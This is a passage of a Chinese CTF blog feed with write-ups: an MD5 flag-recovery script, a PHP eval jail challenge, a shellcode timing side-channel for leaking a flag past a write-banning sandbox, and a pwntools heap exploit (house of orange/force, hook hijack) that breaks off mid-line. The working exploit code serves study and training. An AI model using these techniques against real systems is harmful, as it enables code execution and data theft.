punctuation">,</span><span class="token string">"093f65e080a295f8076b1c5722a46aa2"</span><span class="token punctuation">,</span><span class="token string">"66f041e16a60928b05a7e228a89c3799"</span><span class="token punctuation">,</span><span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span><span class="token string">"9a1158154dfa42caddbd0694a4e9bdc8"</span><span class="token punctuation">,</span><span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span><span class="token string">"a684eceee76fc522773286a895bc8436"</span><span class="token punctuation">,</span><span class="token string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="token punctuation">,</span><span class="token string">"eb160de1de89d9058fcb0b968dbbbd68"</span><span class="token punctuation">,</span><span class="token string">"c45147dee729311ef5b5c3003946c48f"</span><span class="token punctuation">,</span><span class="token string">"7f6ffaa6bb0b408017b62254211691b5"</span><span class="token punctuation">,</span><span class="token string">"07e1cd7dca89a1678042477183b7ac3f"</span><span class="token punctuation">,</span><span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span><span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span><span class="token string">"5ef059938ba799aaa845e1c2e8a762bd"</span><span class="token punctuation">,</span><span class="token string">"a1d0c6e83f027327d8461063f4ac58a6"</span><span class="token punctuation">,</span><span class="token string">"a1d0c6e83f027327d8461063f4ac58a6"</span><span class="token punctuation">,</span><span class="token string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="token punctuation">,</span><span class="token string">"a0a080f42e6f13b3a2df133f073095dd"</span><span class="token punctuation">,</span><span class="token string">"17e62166fc8586dfa4d1bc0e1742c08b"</span><span class="token punctuation">,</span><span class="token string">"3416a75f4cea9109507cacd8e2f2aefc"</span><span class="token punctuation">,</span><span class="token string">"a5771bce93e200c36f7cd9dfd0e5deaa"</span><span class="token punctuation">,</span><span class="token string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="token punctuation">,</span><span class="token string">"a3f390d88e4c41f2747bfa2f1b5f87db"</span><span class="token punctuation">,</span><span class="token string">"6f4922f45568161a8cdf4ad2299f6d23"</span><span class="token punctuation">,</span><span class="token string">"98f13708210194c475687be6106a3b84"</span><span class="token punctuation">,</span><span class="token string">"37693cfc748049e45d87b8c7d8b9aacd"</span><span class="token punctuation">,</span><span class="token string">"7cbbc409ec990f19c78c75bd1e06f215"</span><span class="token punctuation">,</span><span class="token string">"1f0e3dad99908345f7439f8ffabdffc4"</span><span class="token punctuation">,</span><span class="token string">"34173cb38f07f89ddbebc2ac9128303f"</span><span class="token punctuation">,</span><span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span><span class="token string">"35f4a8d465e6e1edc05f3d8ab658c551"</span><span class="token punctuation">,</span><span class="token string">"02e74f10e0327ad868d138f2b4fdd6f0"</span><span class="token punctuation">,</span><span class="token string">"d1fe173d08e959397adf34b1d77e88d7"</span><span class="token punctuation">,</span><span class="token string">"1f0e3dad99908345f7439f8ffabdffc4"</span><span class="token punctuation">,</span><span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>md5_array<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j <span class="token operator">^</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token string">"hint.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$Jail <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'Jail_by.Happy'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$Jail <span class="token operator">==</span> null<span class="token punctuation">)</span> die<span class="token punctuation">(</span><span class="token string">"Do You Like My Jail?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>function Like_Jail<span class="token punctuation">(</span>$var<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/(`|\$|a|c|s|require|include)/i'</span><span class="token punctuation">,</span> $var<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Like_Jail<span class="token punctuation">(</span>$Jail<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>$Jail<span class="token punctuation">)</span><span class="token punctuation">;</span>    echo <span class="token string">"Yes! you escaped from the jail! LOL!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    echo <span class="token string">"You will Jail in your life!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>echo <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token operator">//</span> 在HTML解析后再输出PHP源代码?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行<code>hightlight_file</code>利用<code>glob</code>进行通配符查找</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;A-Dark-Room&quot;&gt;&lt;a href=&quot;#A-Dark-Room&quot; class=&quot;headerlink&quot; title=&quot;A Dark Room&quot;&gt;&lt;/a&gt;A Dark Room&lt;/h2&gt;&lt;p&gt;直接查看源代码，注释里有&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="web" scheme="https://starrysky1004.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>shellcode时间盲注</title>
    <link href="https://starrysky1004.github.io/2024/08/30/shellcode-shi-jian-mang-zhu/shellcode-shi-jian-mang-zhu/"/>
    <id>https://starrysky1004.github.io/2024/08/30/shellcode-shi-jian-mang-zhu/shellcode-shi-jian-mang-zhu/</id>
    <published>2024-08-29T17:17:54.000Z</published>
    <updated>2024-08-29T17:47:51.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>沙箱禁用<code>write</code>的时候可以通过<code>shellcode</code>逐位爆破，先将<code>flag</code>读到栈上，再依次爆破栈上每一位的内容，通过<code>cmp</code>比较的结果跳转到死循环，再根据接收数据的时间差判断是否进入死循环</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="遍历字符集"><a href="#遍历字符集" class="headerlink" title="遍历字符集"></a>遍历字符集</h3><p>在<code>flag</code>出现的字符种类较少的时候使用，直接<code>cmp</code>判断相同的时候跳到死循环，即<code>je</code>，此时字符集中的顺序会影响效率</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> charset<span class="token punctuation">:</span>        <span class="token keyword">global</span> r        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''            mov al, byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">]            cmp al, </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">            je $-2            ret        '''</span></span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'right'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time            li<span class="token punctuation">(</span><span class="token string">'time = '</span> <span class="token operator">+</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>start_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'char = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> j                <span class="token keyword">break</span>        li<span class="token punctuation">(</span><span class="token string">'flag = '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&#125;"</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p>如果字符范围较大可以使用二分法进行优化，即利用<code>ja</code>在大于的时候跳转到死循环，遍历<code>0x20-0x80</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>left <span class="token operator">=</span> <span class="token number">0</span>right <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>        <span class="token keyword">global</span> r        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''            mov al, byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">]            cmp al, </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">            ja $-2            ret        '''</span></span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'right'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time            li<span class="token punctuation">(</span><span class="token string">'time = '</span> <span class="token operator">+</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>start_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'char = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> mid        li<span class="token punctuation">(</span><span class="token string">'flag = '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&#125;"</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>陷入死循环一次<code>clean</code>时间在<code>2</code>秒，除了跳转到死循环的，在比较时不相同也是有时间差的，远程打的越久时间差越大，这种时候可以通过：增加<code>clean</code>的次数，每增加一次死循环后的时间<code>+2</code>，或者把爆破出来的内容添加到<code>flag</code>中之后重启远程。爆破出来的值也不完全准确，需要多次测试。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;沙箱禁用&lt;code&gt;write&lt;/code&gt;的时候可以通过&lt;code&gt;shellcode&lt;/code&gt;逐位爆破，先将&lt;code&gt;flag&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="侧信道" scheme="https://starrysky1004.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>2024极客少年-PWN</title>
    <link href="https://starrysky1004.github.io/2024/08/10/2024-ji-ke-shao-nian-pwn/2024-ji-ke-shao-nian-pwn/"/>
    <id>https://starrysky1004.github.io/2024/08/10/2024-ji-ke-shao-nian-pwn/2024-ji-ke-shao-nian-pwn/</id>
    <published>2024-08-10T09:37:54.000Z</published>
    <updated>2024-08-10T09:44:39.369Z</updated>
    
    <content type="html"><![CDATA[<h3 id="orangeforce"><a href="#orangeforce" class="headerlink" title="orangeforce"></a>orangeforce</h3><p><code>house of orange + house of force</code>，无<code>edit</code>和<code>delete</code>，限制创建堆块数量六个，可以溢出<code>8</code>字节，创建堆块之前还要先创建一个<code>character</code>才能去创建堆</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add_character</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> flag <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your character has been created."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">6uLL</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_202060<span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Created."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先利用<code>house of orange</code>缩小<code>top chunk</code>的大小，但要保证修改的大小加上<code>top chunk</code>的地址最后三位为<code>0</code>，再创建一个比<code>top chunk size</code>更大的堆使得<code>top chunk</code>被释放进<code>unsorted bin</code>，此时得到<code>libc</code>地址，最后申请一个堆获得堆地址</p><p>泄露完地址再利用<code>house of force</code>，改<code>top chunk size</code>为<code>-1</code>，再申请<code>target - top_chunk - 0x20</code>大小的堆，使得<code>top chunk</code>落在<code>target</code>，这里需要改<code>malloc_hook</code>，但是直接改<code>malloc_hook</code>为<code>ogg</code>不能打通，所以需要利用<code>realloc_hook</code>，即将<code>top chunk</code>落在<code>realloc_hook</code>，最后申请一个堆改<code>realloc_hook</code>为<code>ogg</code>、改<code>malloc_hook</code>为<code>realloc + 2</code></p><p>此时已经用掉了六个堆，还需要创建一次堆触发<code>ogg</code>，利用<code>scanf</code>输入很长一段字符串可以导致<code>scanf</code>内部扩展缓冲区从而调用<code>init_malloc</code>来分配更大的空间的特性在<code>scanf</code>时输入很长的内容来<code>malloc</code>触发<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_c</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> STR<span class="token punctuation">,</span> DEF<span class="token punctuation">,</span> DEX<span class="token punctuation">,</span> ACC<span class="token punctuation">,</span> INT<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Name'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'STR'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>STR<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'DEF'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>DEF<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'DEX'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>DEX<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'ACC'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ACC<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'INT'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>INT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Power'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add_c<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xd81</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>realloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>realloc <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>top_chunk <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x21920</span>add<span class="token 